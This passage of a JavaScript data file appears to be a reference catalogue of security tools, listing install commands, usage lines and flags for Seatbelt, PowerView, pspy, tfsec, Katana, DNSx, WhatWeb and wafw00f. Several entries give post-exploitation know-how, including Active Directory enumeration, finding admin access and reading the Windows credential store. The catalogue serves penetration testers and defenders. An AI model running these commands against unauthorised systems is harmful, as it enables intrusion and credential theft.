      { flag: "ARPTable", desc: "ARP cache" },
      { flag: "ChromiumBookmarks", desc: "Browser bookmarks" },
      { flag: "CredentialManager", desc: "Windows credential store" },
      { flag: "InterestingFiles", desc: "Files with sensitive names" }
    ],
    outputFormat: "console text, JSON (-outputfile json)",
    integrations: ["CobaltStrike (execute-assembly)", "Metasploit"],
    url: "https://github.com/GhostPack/Seatbelt"
  },
  {
    name: "PowerView",
    category: "post-exploitation",
    description: "PowerShell tool for Active Directory enumeration and exploitation — find users, groups, shares, GPOs, ACLs, trusts, and attack paths",
    install: "Import-Module .\\PowerView.ps1 (from PowerSploit)",
    usage: [
      "Get-DomainUser -SPN",
      "Find-LocalAdminAccess -Thread 20",
      "Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs"
    ],
    advancedFlags: [
      { flag: "Get-DomainUser", desc: "Enumerate domain users" },
      { flag: "Get-DomainGroup", desc: "Enumerate domain groups" },
      { flag: "Get-DomainComputer", desc: "Enumerate computers" },
      { flag: "Find-LocalAdminAccess", desc: "Find admin access across network" },
      { flag: "Get-DomainObjectAcl", desc: "ACL enumeration" },
      { flag: "Find-DomainShare", desc: "Find accessible shares" },
      { flag: "Get-DomainGPO", desc: "Enumerate GPOs" },
      { flag: "Get-DomainTrust", desc: "Enumerate trusts" }
    ],
    outputFormat: "PowerShell objects (Format-Table, Export-CSV, ConvertTo-Json)",
    integrations: ["BloodHound", "Mimikatz", "Rubeus"],
    url: "https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon"
  },
  {
    name: "pspy",
    category: "post-exploitation",
    description: "Monitor Linux processes without root — detect cron jobs, scheduled tasks, and commands run by other users in real-time",
    install: "Download from https://github.com/DominicBreuker/pspy/releases",
    usage: [
      "./pspy64",
      "./pspy32 -pf -i 1000"
    ],
    advancedFlags: [
      { flag: "-pf", desc: "Enable file system events (inotify)" },
      { flag: "-i", desc: "Scan interval in milliseconds" },
      { flag: "-r", desc: "Directories to watch" },
      { flag: "-c", desc: "Use color" }
    ],
    outputFormat: "console text (timestamped process events)",
    integrations: ["LinPEAS (complementary)"],
    url: "https://github.com/DominicBreuker/pspy"
  },
  {
    name: "Terraform Scanner (tfsec)",
    category: "cloud-security",
    description: "Static analysis for Terraform code — detect security misconfigurations before they reach cloud infrastructure",
    install: "go install github.com/aquasecurity/tfsec/cmd/tfsec@latest",
    usage: [
      "tfsec .",
      "tfsec --format json --out results.json",
      "tfsec --minimum-severity HIGH"
    ],
    advancedFlags: [
      { flag: "--format", desc: "Output format (default, json, csv, sarif)" },
      { flag: "--minimum-severity", desc: "Filter by severity" },
      { flag: "--exclude", desc: "Exclude specific check IDs" },
      { flag: "--tfvars-file", desc: "Variable values file" },
      { flag: "--config-file", desc: "Custom config file" }
    ],
    outputFormat: "text, JSON, CSV, SARIF, JUnit",
    integrations: ["Trivy (now includes tfsec)", "GitHub Actions", "pre-commit"],
    url: "https://github.com/aquasecurity/tfsec"
  },
  {
    name: "Katana",
    category: "web",
    description: "Next-generation web crawler by ProjectDiscovery — JavaScript rendering, headless mode, scope control, and automatic form filling",
    install: "go install github.com/projectdiscovery/katana/cmd/katana@latest",
    usage: [
      "katana -u https://target.com",
      "katana -u https://target.com -jc -headless -d 3"
    ],
    advancedFlags: [
      { flag: "-u", desc: "Target URL" },
      { flag: "-d", desc: "Crawl depth" },
      { flag: "-jc", desc: "Enable JavaScript crawling" },
      { flag: "-headless", desc: "Use headless browser" },
      { flag: "-aff", desc: "Automatic form fill" },
      { flag: "-fs", desc: "Field scope (rdn, fqdn, dn)" },
      { flag: "-ef", desc: "Exclude file extensions" },
      { flag: "-json", desc: "JSON output" }
    ],
    outputFormat: "text (URL list), JSON",
    integrations: ["httpx", "Nuclei", "ffuf"],
    url: "https://github.com/projectdiscovery/katana"
  },
  {
    name: "DNSx",
    category: "osint",
    description: "Fast and multi-purpose DNS toolkit — brute-force, resolution, wildcard filtering, and DNS record queries at scale",
    install: "go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest",
    usage: [
      "echo target.com | dnsx -resp -a -aaaa -mx -ns -cname",
      "cat subs.txt | dnsx -silent -a -resp-only",
      "dnsx -d target.com -w dns-wordlist.txt"
    ],
    advancedFlags: [
      { flag: "-a/-aaaa/-mx/-ns/-cname/-txt", desc: "Record type queries" },
      { flag: "-resp", desc: "Show DNS response" },
      { flag: "-resp-only", desc: "Show only response values" },
      { flag: "-d", desc: "Target domain for brute-force" },
      { flag: "-w", desc: "Wordlist for brute-force" },
      { flag: "-wd", desc: "Wildcard domain filter" },
      { flag: "-json", desc: "JSON output" }
    ],
    outputFormat: "text, JSON",
    integrations: ["subfinder", "httpx", "Nuclei"],
    url: "https://github.com/projectdiscovery/dnsx"
  },
  {
    name: "Whatweb",
    category: "web",
    description: "Web technology fingerprinting tool — identify CMS, frameworks, web servers, JavaScript libraries, and embedded devices",
    install: "sudo apt install whatweb",
    usage: [
      "whatweb https://target.com",
      "whatweb -a 3 -v https://target.com"
    ],
    advancedFlags: [
      { flag: "-a", desc: "Aggression level (1=stealthy, 3=aggressive, 4=heavy)" },
      { flag: "-v", desc: "Verbose output" },
      { flag: "--log-json", desc: "JSON log file" },
      { flag: "--log-xml", desc: "XML log file" },
      { flag: "--user-agent", desc: "Custom user agent" },
      { flag: "--proxy", desc: "HTTP proxy" }
    ],
    outputFormat: "text, JSON, XML, MongoDB, SQL",
    integrations: ["Nmap", "Nuclei"],
    url: "https://github.com/urbanadventurer/WhatWeb"
  },
  {
    name: "wafw00f",
    category: "web",
    description: "Web Application Firewall fingerprinting — identify which WAF product is protecting a target website from a database of 100+ WAFs",
    install: "pip install wafw00f",
    usage: [
      "wafw00f https://target.com",
      "wafw00f -a https://target.com",
      "wafw00f -l"
    ],
    advancedFlags: [
      { flag: "-a", desc: "Test all WAF signatures" },
      { flag: "-l", desc: "List all detectable WAFs" },
      { flag: "-p", desc: "Use proxy" },
      { flag: "-o", desc: "Output to file" },
      { flag: "-f", desc: "Output format (json, csv)" }
    ],
    outputFormat: "text, JSON, CSV",
    integrations: ["Burp Suite", "Nuclei"],
    url: "https://github.com/EnableSecurity/wafw00f"
  },
];

// Category index
export const TOOL_CATEGORIES = [...new Set(SECURITY_TOOLS_REF.map(t => t.category))].sort();
export const TOOLS_COUNT = SECURITY_TOOLS_REF.length;
export const TOOLS_BY_CATEGORY = TOOL_CATEGORIES.reduce((acc, cat) => {
  acc[cat] = SECURITY_TOOLS_REF.filter(t => t.category === cat);
  return acc;
}, {});
